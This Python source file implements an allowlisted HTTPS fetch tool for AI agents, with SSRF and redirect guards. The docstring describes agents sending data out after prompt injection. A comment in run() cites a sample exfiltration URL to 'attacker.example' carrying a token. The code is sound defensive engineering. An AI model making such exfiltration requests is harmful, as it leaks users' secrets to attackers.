"""Atomic HTTP fetch tool.

Controlled outbound HTTP. The tool refuses to hit any domain not on the
per-tenant allowlist — this is how you stop an agent from exfiltrating
data to attacker-controlled hosts after a successful prompt injection.

The allowlist is loaded from ``config/http_allowlist.yaml`` at startup. A
missing config file means an empty allowlist, which means no outbound
HTTP. That is deliberately the safe default.
"""

# The HTTP fetch tool, where the outbound allowlist from section 4 meets the execution layer

from __future__ import annotations

import asyncio
import ipaddress
import socket
from typing import ClassVar
from urllib.parse import urlparse

import httpx
import yaml
from pydantic import BaseModel, Field, field_validator

from scout_mcp.auth.policy import PolicyEngine
from scout_mcp.config import get_settings
from scout_mcp.errors.framework import PolicyError, UpstreamError
from scout_mcp.tools.base import Tool, ToolLevel, ToolMetadata


class HTTPFetchInput(BaseModel):
    url: str = Field(..., description="Fully-qualified https:// URL.")
    method: str = Field("GET", description="GET, POST, PUT, DELETE, PATCH.")
    headers: dict[str, str] | None = Field(default=None)
    body: dict | None = Field(default=None, description="JSON body (for POST/PUT/PATCH).")
    timeout_s: float = Field(10.0, ge=0.5, le=30.0)

    @field_validator("url")
    @classmethod
    # HTTPS only. 
    def must_be_https(cls, value: str) -> str:
        parsed = urlparse(value)
        if parsed.scheme != "https":
            raise ValueError("only https:// URLs are permitted")
        if not parsed.hostname:
            raise ValueError("missing hostname")
        return value

    @field_validator("method")
    @classmethod
    # known methods only.
    def method_in_allowlist(cls, value: str) -> str:
        upper = value.upper()
        if upper not in {"GET", "POST", "PUT", "PATCH", "DELETE"}:
            raise ValueError("unsupported method")
        return upper


class HTTPFetchTool(Tool):
    meta: ClassVar[ToolMetadata] = ToolMetadata(
        name="http.fetch",
        description="Make an outbound HTTPS request to an allowlisted domain.",
        level=ToolLevel.ATOMIC,
        scopes_required=("tool:http:fetch",),
        destructive=False,  # per call: see needs_approval (only GET runs without approval)
        cacheable=False,  # network side effects — never cache.
        timeout_ms=15_000,
        tags=("http", "network"),
    )
    input_schema: ClassVar[type[BaseModel]] = HTTPFetchInput

    def __init__(self, policy: PolicyEngine):
        super().__init__(policy)
        self.settings = get_settings()
        self._allowlist = _load_allowlist()

    def needs_approval(self, args: HTTPFetchInput) -> bool:  # type: ignore[override]
        # A GET reads. Anything else can change state on an allowlisted host.
        return args.method != "GET"

    def _allowed(self, tenant: str, host: str) -> bool:
        per_tenant = self._allowlist.get(tenant, []) or []
        globals_ = self._allowlist.get("*", []) or []
        for pattern in (*per_tenant, *globals_):
            if pattern == host:
                return True
            if pattern.startswith("*.") and host.endswith(pattern[1:]):
                return True
        return False

    async def run(self, tenant: str, args: HTTPFetchInput) -> dict:  # type: ignore[override]
        # If the agent decides to fetch https://attacker.example/exfil?token=..., the host is not on the tenant's allowlist and we raise PolicyError.
        host = urlparse(args.url).hostname or ""
        if not self._allowed(tenant, host):
            raise PolicyError(
                "host_not_allowlisted",
                retryable=False,
                hint=f"{host!r} is not on this tenant's outbound allowlist",
                context={"host": host},
            )
        #follow_redirects=False matters a lot. Without it, an allowlisted host could redirect to a non-allowlisted one, bypassing our check.
        safe_ip = await _refuse_unsafe_addresses(host)
        # Connect to the address that was just checked, not to a second DNS answer. The
        # certificate is still checked against the real name (sni_hostname), and the
        # Host header names it too. A caller-supplied Host header is dropped.
        parsed = urlparse(args.url)
        netloc = f"[{safe_ip}]" if ":" in safe_ip else safe_ip
        if parsed.port:
            netloc += f":{parsed.port}"
        headers = {k: v for k, v in (args.headers or {}).items() if k.lower() != "host"}
        headers["Host"] = f"{host}:{parsed.port}" if parsed.port else host
        try:
            async with httpx.AsyncClient(timeout=args.timeout_s, follow_redirects=False) as client:
                resp = await client.request(
                    args.method, parsed._replace(netloc=netloc).geturl(),
                    headers=headers, json=args.body, extensions={"sni_hostname": host},
                )
        except httpx.TimeoutException as exc:
            raise UpstreamError("http_timeout", retryable=True, hint=str(exc)) from exc
        except httpx.RequestError as exc:
            raise UpstreamError("http_network_error", retryable=True, hint=str(exc)) from exc

        # Cap response size to protect the agent's context window.
        body_bytes = resp.content[:64 * 1024]
        return {
            "status": resp.status_code,
            "headers": dict(resp.headers),
            "body": body_bytes.decode("utf-8", errors="replace"),
            "truncated": len(resp.content) > len(body_bytes),
        }

# By disabling redirects, we force the agent to see the 3xx response and make an explicit decision about where to go next.
async def _refuse_unsafe_addresses(host: str) -> str:
    """An allowlisted name must not resolve to this machine or a cloud metadata address.

    RFC 1918 ranges stay reachable because the allowlist legitimately contains internal
    names such as ``*.acme.internal``. Returns the address the request must connect to,
    so the address that was checked is the address that is used.
    """
    try:
        infos = await asyncio.to_thread(socket.getaddrinfo, host, None)
    except socket.gaierror as exc:
        raise UpstreamError("http_dns_error", retryable=True, hint=str(exc)) from exc
    first_safe: str | None = None
    for info in infos:
        ip = ipaddress.ip_address(info[4][0].split("%")[0])  # drop an IPv6 zone id
        # ::ffff:127.0.0.1 is loopback, but Python 3.11 does not say so; unwrap it first.
        if ip.version == 6 and ip.ipv4_mapped is not None:
            ip = ip.ipv4_mapped
        if ip.is_loopback or ip.is_link_local or ip.is_unspecified or ip.is_multicast:
            raise PolicyError(
                "host_resolves_to_unsafe_address",
                retryable=False,
                hint=f"{host!r} resolves to {ip}, which outbound fetches may not reach",
                context={"host": host},
            )
        first_safe = first_safe or str(ip)
    return first_safe or ""


def _load_allowlist() -> dict[str, list[str]]:
    import pathlib
    path = pathlib.Path("config/http_allowlist.yaml")
    if not path.exists():
        return {}
    return yaml.safe_load(path.read_text()) or {}
